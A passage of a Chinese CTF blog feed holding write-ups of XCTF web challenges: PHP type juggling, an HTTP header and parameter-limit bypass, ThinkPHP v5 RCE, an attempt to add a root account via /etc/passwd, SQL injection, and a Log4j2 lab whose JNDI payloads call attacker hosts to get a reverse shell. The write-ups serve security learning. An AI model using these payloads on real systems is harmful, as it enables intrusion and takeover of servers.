class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查 &quot;c&quot; 中的 &quot;n&quot; 是否是数组，并且数组长度为 2，并且数组的第一个元素也是数组。</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查 &quot;c&quot; 是否是数组，并且其中的 &quot;m&quot; 不是数字，并且其值大于 2022。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过阅读源码可以看到php文件通过get方法获取了四个参数，a、b、c、d</p>
+<ul>
+<li>其中a的限制是a的值大于6000000且a的值的字符串长小于等于3，考虑科学计数法1e9、1e7、1e8都可以</li>
+<li>b的限制是经过md5编码后最后的六位是8b184b，可以考虑爆破出符合要求的数字，注意需要先将数字转化为字节流</li>
+<li>c的限制是需要是个数组且c中m的键值不为数字但是应该大于2022，考虑相似结构c={“m”:”2023a”}，2023a是字符串且2023a与2022进行比较会被解析为2023与2022进行比较，但是如果是a2023则会被解析为0</li>
+<li>d的限制是c中存在一个键n，且n是一个数组长度为2，并且n中第一个位置也是一个数组，d为从n中查询DGGJ返回的值，如果是false则无法通过过滤，将n中值赋给val在和DGGJ比较，如果返回结果为true则无法通过过滤，值得注意的是array_search的运行原理是将DGGJ与n中所有值进行逐一比较，所以当DGGJ与0进行比较时，DGGJ是字符串0是整数型，在php中进行二者进行比较php松散类型会将DGGJ解析为0，所以会返回true成功达成过滤。而下面的判断语句使用===即判断值也判断类型所以会返回false，绕过过滤，因此考虑{“n”:[[],0]}最后得到:c={“m”:”2023a”,”n”:[[],0]}</li>
+</ul>
+<p>payload</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:61986&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    b=<span class="selector-tag">i</span><span class="selector-class">.to_bytes</span>(<span class="number">22</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    m=hashlib<span class="selector-class">.md5</span>(<span class="built_in">str</span>(i)<span class="selector-class">.encode</span>())<span class="selector-class">.hexdigest</span>()</span><br><span class="line">    <span class="built_in">if</span>(m<span class="selector-attr">[-6:]</span>==<span class="string">&quot;8b184b&quot;</span>):</span><br><span class="line">        <span class="selector-tag">b</span> = <span class="selector-tag">i</span></span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:<span class="string">&quot;1e9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:<span class="selector-tag">b</span>,</span><br><span class="line">    <span class="string">&quot;c&quot;</span>:<span class="string">&#x27;&#123;&quot;m&quot;:&quot;2023a&quot;,&quot;n&quot;:[[0,1],0]&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests<span class="selector-class">.get</span>(url,params=params)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response<span class="selector-class">.status_code</span> == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请求成功！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;响应内容&quot;</span>,response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请求失败！状态码:&quot;</span>,response.status_code)</span><br></pre></td></tr></table></figure>
+<h1 id><a href="#" class="headerlink" title="#"></a>#</h1>]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ez_curl</title>
+    <url>/2023/07/27/ez-curl/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：RFC 7230和express中parameterLimit参数</p>
+<span id="more"></span>
+<p>给出源代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://back-end:3000/flag?&#x27;</span>;</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$headers</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;headers;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$headers</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$offset</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$offset</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;admin&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="string">&#x27;true&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$params</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;params;</span><br><span class="line"><span class="variable">$url</span> .= <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_NOBODY, <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>
+<p>上述代码表示了监听的位置以及遍历请求体中的请求头键是否存在{“admin”:true}这个键值，存在则打印try hard，不存在则执行在url中附上params以及&amp;admin=false，也就是添加了键admin且值一定存在false。</p>
+<p>查看给出的app.js</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">flag</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">query</span>.<span class="property">admin</span>.<span class="title function_">includes</span>(<span class="string">&#x27;false&#x27;</span>) &amp;&amp; req.<span class="property">headers</span>.<span class="property">admin</span>.<span class="title function_">includes</span>(<span class="string">&#x27;true&#x27;</span>))&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(&#123; <span class="attr">port</span>: port , <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>
+<p>上述代码可以看到引入了express框架，在访问flag接口时如果admin键中存在true且没有false则返回环境变量中的flag，否则返回try hard。</p>
+<p>通过查询可以得知express使用urlencoded中间件时默认的parameterlimit参数为1000，这是为了平衡服务器负载。paraneterlimit参数负责限制url中允许被解析的参数上限。</p>
+<p>所以思路可以构造超过一千个键值的请求体，在其中构造payload设置admin=true，并且当url在被附上admin=false时已经超出了express的解析范围。</p>
+<p>总结一下：php文件中限制了请求头中不能出现admin:true</p>
+<p>app.js中限制了请求体中admin参数值不能为false且请求头中admin值应该为true</p>
+<p>所以构造payload需要查看RFC 7230(HTTP/1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII 字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header 是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:60110/&quot;</span></span><br><span class="line">datas = &#123;<span class="string">&quot;headers&quot;</span>: <span class="selector-attr">[<span class="string">&quot;admin:a&quot;</span>,<span class="string">&quot; true:a&quot;</span>, <span class="string">&quot;Content-Type: application/json&quot;</span>]</span>,<span class="string">&quot;params&quot;</span>: &#123;<span class="string">&quot;admin&quot;</span>: <span class="string">&quot;akali&quot;</span>&#125;&#125;</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    datas<span class="selector-attr">[<span class="string">&quot;params&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;x&quot;</span> + str(i)]</span> = <span class="selector-tag">i</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json1 = json<span class="selector-class">.dumps</span>(datas)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(json1)</span></span></span><br><span class="line">resp = requests<span class="selector-class">.post</span>(url, headers=headers, data=json1)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(resp.content)</span></span></span><br></pre></td></tr></table></figure>
+<p>请注意<code>datas = &#123;&quot;headers&quot;: [&quot;admin:a&quot;,&quot; true:a&quot;, &quot;Content-Type: application/json&quot;],&quot;params&quot;: &#123;&quot;admin&quot;: &quot;akali&quot;&#125;&#125;</code>中{“headers”: [“admin:a”,” true:a”]}可以绕过php代码中的die(“try hard”)，且在nodejs解析时<code>&#123;&quot;admin&quot;:&quot;a true a&quot;&#125;</code>，根据app.js中条件admin只需要包含true就可以了</p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>wife_wife</title>
+    <url>/2023/07/25/wife-wife/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>JS原型链污染</p>
+<span id="more"></span>
+<p>给出一个登陆界面，看到有注册，有url框，很容易会想到注入和爆破，但是题目要求说了不需要爆破，抓个包看看</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702180815052.png" alt="image-20230702180815052"></p>
+<p>很明显传递了两个参数username和password</p>
+<p>账户密码错误或为空会返回</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702181651762.png" alt="image-20230702181651762"></p>
+<p>检查注册页面</p>
+<p>成功注册</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702181924542.png" alt="image-20230702181924542"></p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182016261.png" alt="image-20230702182016261"></p>
+<p>注意到还有一个is admin选项</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182128449.png" alt="image-20230702182128449"></p>
+<p>会多出一个invite code选项，并且会前端检查是否填写</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182106478.png" alt="image-20230702182106478"></p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182211209.png" alt="image-20230702182211209"></p>
+<p>多两个参数，尝试更改参数，但是没有用。nmap进行端口扫描</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182532710.png" alt="image-20230702182532710"></p>
+<p>很多apache服务</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182553404.png" alt="image-20230702182553404"></p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182706094.png" alt="image-20230702182706094"></p>
+<p><img src="/2023/07/25/wife-wife/image-20230702182746936.png" alt="image-20230702182746936"></p>
+<p>经典漏洞远程执行</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702183653753.png" alt="image-20230702183653753"></p>
+<p>可能存在文件上传漏洞</p>
+<p>通过端口扫描得到两个可能存在漏洞的页面和一个php代码</p>
+<p>thinkphp v5 payload</p>
+<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">构造url：ip/index.php?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span><span class="params">[0]</span>=<span class="title">system</span>&amp;<span class="title">vars</span><span class="params">[1]</span><span class="params">[]</span>=<span class="params">[linux指令]</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/25/wife-wife/image-20230702183957488.png" alt="image-20230702183957488"></p>
+<p>得到我们是www-data用户</p>
+<p>nc尝试正向连接与反向连接均失败</p>
+<p>尝试创建root权限用户，查看passwd表中书写格式</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702185059204.png" alt="image-20230702185059204"></p>
+<p>openssl生成用户并获得加密后的密码</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl</span> passwd -<span class="number">1</span> -salt<span class="meta"> [username] [password]</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/25/wife-wife/image-20230702185209920.png" alt="image-20230702185209920"></p>
+<p>按照root格式写入passwd文件</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;root:<span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0 <span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>但是被拒绝</p>
+<p>查看系统版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/25/wife-wife/image-20230702190107598.png" alt="image-20230702190107598"></p>
+<p><img src="/2023/07/25/wife-wife/image-20230702190136068.png" alt="image-20230702190136068"></p>
+<p>找一下有没有合适的exploit</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702191918573.png" alt="image-20230702191918573"></p>
+<p>但是发现无法写入文件也无法切换到tmp下</p>
+<p>尝试定时任务提权也发现并没有可写权限的文件</p>
+<p>目前通过www-data提权方式走不通</p>
+<p>ls看看当前能访问的文件</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702192713361.png" alt="image-20230702192713361"></p>
+<p>router.php<br><img src="/2023/07/25/wife-wife/image-20230702192807453.png" alt="image-20230702192807453"></p>
+<p>index.php<br><img src="/2023/07/25/wife-wife/image-20230702192902763.png" alt="image-20230702192902763"></p>
+<p>robots.txt<br><img src="/2023/07/25/wife-wife/image-20230702192934875.png" alt="image-20230702192934875"></p>
+<p>当前路径<br><img src="/2023/07/25/wife-wife/image-20230702193207392.png" alt="image-20230702193207392"></p>
+<p>没有找到特别有用的信息，看一下文件上传页面，上传正常图片<br><img src="/2023/07/25/wife-wife/image-20230702193401485.png" alt="image-20230702193401485"></p>
+<p>上传php图片时，而且是前端验证<br><img src="/2023/07/25/wife-wife/image-20230702193515809.png" alt="image-20230702193515809"></p>
+<p>尝试图片马<br><img src="/2023/07/25/wife-wife/image-20230702193639916.png" alt="image-20230702193639916"></p>
+<p>存在端口的影响，绝对路径也很难用御剑爆破出来</p>
+<p>wp查看源码，得到是一个原型链污染</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702200247737.png" alt="image-20230702200247737"></p>
+<p>就可以了</p>
+<p><img src="/2023/07/25/wife-wife/image-20230702200658611.png" alt="image-20230702200658611"></p>
+<p><img src="/2023/07/25/wife-wife/image-20230702200727563.png" alt="image-20230702200727563"></p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>file_include</title>
+    <url>/2023/07/25/file-include22/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：伪协议与convert.iconv.*绕过</p>
+<span id="more"></span>
+<p><img src="/2023/07/25/file-include22/image-20230725182149696.png" alt="image-20230725182149696"></p>
+<p>传入变量filename并允许filename文件</p>
+<p>使用php://filter伪协议查看源码</p>
+<p><img src="/2023/07/25/file-include22/image-20230725182458293.png" alt="image-20230725182458293"></p>
+<p>然后发现有waf，尝试convert.iconv.*绕过</p>
+<p><img src="/2023/07/25/file-include22/image-20230725183217309.png" alt="image-20230725183217309"></p>
+<p>猜测存在flag文件</p>
+<p><img src="/2023/07/25/file-include22/image-20230725183244082.png" alt="image-20230725183244082"></p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ingnt</title>
+    <url>/2023/07/25/ingnt/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：sql注入</p>
+<span id="more"></span>
+<p><img src="/2023/07/25/ingnt/image-20230725175437435.png" alt="image-20230725175437435"></p>
+<p>尝试sql注入</p>
+<p><img src="/2023/07/25/ingnt/image-20230725175503181.png" alt="image-20230725175503181"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725175522558.png" alt="image-20230725175522558"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725175541628.png" alt="image-20230725175541628"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725175552865.png" alt="image-20230725175552865"></p>
+<p>可以得到flag并且得知是盲注</p>
+<p>sqlmap方法</p>
+<p><img src="/2023/07/25/ingnt/image-20230725180148916.png" alt="image-20230725180148916"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725180241889.png" alt="image-20230725180241889"></p>
+<p>存在get注入和联合注入以及一些些版本信息</p>
+<p><img src="/2023/07/25/ingnt/image-20230725180326457.png" alt="image-20230725180326457"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725180333647.png" alt="image-20230725180333647"></p>
+<p>得到四个数据库</p>
+<p>查看当前数据库</p>
+<p><img src="/2023/07/25/ingnt/image-20230725180351550.png" alt="image-20230725180351550"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725180402086.png" alt="image-20230725180402086"></p>
+<p>查看表</p>
+<p><img src="/2023/07/25/ingnt/image-20230725180434468.png" alt="image-20230725180434468"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725180425511.png" alt="image-20230725180425511"></p>
+<p>查看表中内容</p>
+<p><img src="/2023/07/25/ingnt/image-20230725180634921.png" alt="image-20230725180634921"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725180641114.png" alt="image-20230725180641114"></p>
+<p>查看数据</p>
+<p><img src="/2023/07/25/ingnt/image-20230725180728565.png" alt="image-20230725180728565"></p>
+<p><img src="/2023/07/25/ingnt/image-20230725180736779.png" alt="image-20230725180736779"></p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ics-06</title>
+    <url>/2023/07/25/ics-06/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：id遍历</p>
+<span id="more"></span>
+<p><img src="/2023/07/25/ics-06/image-20230725170015091.png" alt="image-20230725170015091"></p>
+<p>这个页面中只有报表中心能点击</p>
+<p><img src="/2023/07/25/ics-06/image-20230725170044437.png" alt="image-20230725170044437"></p>
+<p>只有一个日期选择，但是不管选择什么都没有反应。</p>
+<p>看到url认为可能存在sql注入，但是测试了半天也没有，看wp才知道是一个id遍历的题目，丢入bp进行爆破当id=2333时，出现不同</p>
+<p><img src="/2023/07/25/ics-06/image-20220815103556967.png" alt></p>
+<p><img src="/2023/07/25/ics-06/image-20220815103629272.png" alt></p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>baby_web</title>
+    <url>/2023/07/25/baby-web/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：状态码和响应头参数</p>
+<span id="more"></span>
+<p>直接打开后，如图</p>
+<p><img src="/2023/07/25/baby-web/Users/akali/Desktop/blog/source/_posts/负载均衡/image-20230725163738353.png" alt="image-20230725163738353"></p>
+<p>根据题目描述，删除1.php访问，查看网络得到</p>
+<p><img src="/2023/07/25/baby-web/image-20230725164114268.png" alt="image-20230725164114268"></p>
+<p>出现状态为302的页面表示重定向</p>
+<p><img src="/2023/07/25/baby-web/image-20230725164534735.png" alt="image-20230725164534735"></p>
+<p>302页面响应中看到flag</p>
+<p>或者使用bp抓包也可以以获得</p>
+<p><img src="/2023/07/25/baby-web/image-20230725164622176.png" alt="image-20230725164622176"></p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Log4j2</title>
+    <url>/2023/07/22/Log4j2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>log4j2-rce</p>
+<span id="more"></span>
+<h1 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h1><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>CVE-2021-44228</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache log4j2.x &lt;= 2.14.1</p>
+<p>受影响的组件和应用有spring-boot-strater-log4j2 / Apache Solr / Apache Flink / Apache Druid等</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Apache Log4j2是一个基于Java的日志记录工具，该日志框架被大量用于业务系统开发，用来记录日志信息。</p>
+<p>Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发Log4j2组件解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限。</p>
+<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>Solr 提供了一个管理接口，用于管理 Solr 实例的配置、核心和其他相关功能。这个管理接口是通过 HTTP 请求与 Solr 服务器进行交互的。</p>
+<p>以下是一些常见的 Solr 管理接口操作：</p>
+<ol>
+<li>查询核心信息（Core API）：使用 <code>/admin/cores</code> 端点可以获取有关当前配置的 Solr 核心的信息，包括核心的名称、路径、状态等。</li>
+<li>添加、删除和重加载核心：使用 <code>/admin/cores?action=create</code> 可以创建新的 Solr 核心，使用 <code>/admin/cores?action=unload</code> 可以卸载（删除）现有的核心，使用 <code>/admin/cores?action=reload</code> 可以重新加载核心。</li>
+<li>管理配置（Config API）：使用 <code>/admin/configs</code> 端点可以管理 Solr 的配置文件。可以上传新的配置文件、列出已有的配置文件、删除配置文件等。</li>
+<li>查询系统信息（System API）：使用 <code>/admin/info/system</code> 端点可以获取有关 Solr 服务器的系统信息，如操作系统、Java 版本、内存使用情况等。</li>
+<li>查询集群状态（Collections API）：使用 <code>/admin/collections</code> 端点可以获取有关 Solr 集群的信息，包括集群中的核心、分片、副本等的状态和配置。</li>
+<li>进行索引和搜索操作（Update API）：使用 <code>/update</code> 端点可以进行索引和搜索操作，包括添加、更新和删除文档。</li>
+</ol>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/2023/07/22/Log4j2/image-20230717162518541-16900228152491.png" alt="image-20230717162518541"></p>
+<p>看到有apache Solr服务，查询得知也在log4j2影响范围内，尝试验证是否存在log4j2漏洞</p>
+<p>通过core的api接口<br><img src="/2023/07/22/Log4j2/image-20230717170824441-16900228285032.png" alt="image-20230717170824441"></p>
+<p>其中action为可控参数，后台未对前端用户传递的action参数进行校验，导致存在命令执行漏洞。</p>
+<p>构造dnslog payload：<code>$&#123;jndi:ldap://5sga3s.dnslog.cn&#125;</code></p>
+<p><img src="/2023/07/22/Log4j2/image-20230717171059472-16900228388363.png" alt="image-20230717171059472"></p>
+<p>dnslog平台有回显，证明存在该漏洞</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="/2023/07/22/Log4j2/image-20230717172109298.png" alt="image-20230717172109298"></p>
+<p><img src="/2023/07/22/Log4j2/image-20230717172214254-16900228584674.png" alt="image-20230717172214254"></p>
+<p>得到rmi、ldap值为xd3opg，构造payload：<code>$&#123;jndi:rmi://192.168.115.128:1099/xd3opg&#125;</code></p>
+<p><img src="/2023/07/22/Log4j2/image-20230717172538750.png" alt="image-20230717172538750"></p>
+<p>攻击端服务器回显</p>
+<p><img src="/2023/07/22/Log4j2/image-20230718094817851-16900228756395.png" alt="image-20230718094817851"></p>
+<p>获得反弹shell</p>
+<p><img src="/2023/07/22/Log4j2/image-20230718094950031-16900228920976.png" alt="image-20230718094950031"></p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>在攻击机脚本返回的消息中<br><img src="/2023/07/22/Log4j2/image-20230718100122935-16900229265087.png" alt="image-20230718100122935"></p>
+<p>wireshark追踪tcp流</p>
+<p><img src="/2023/07/22/Log4j2/image-20230718100231234-16900229364008.png" alt="image-20230718100231234"></p>
+<p>可以看到攻击代码，然后调用反弹shell</p>
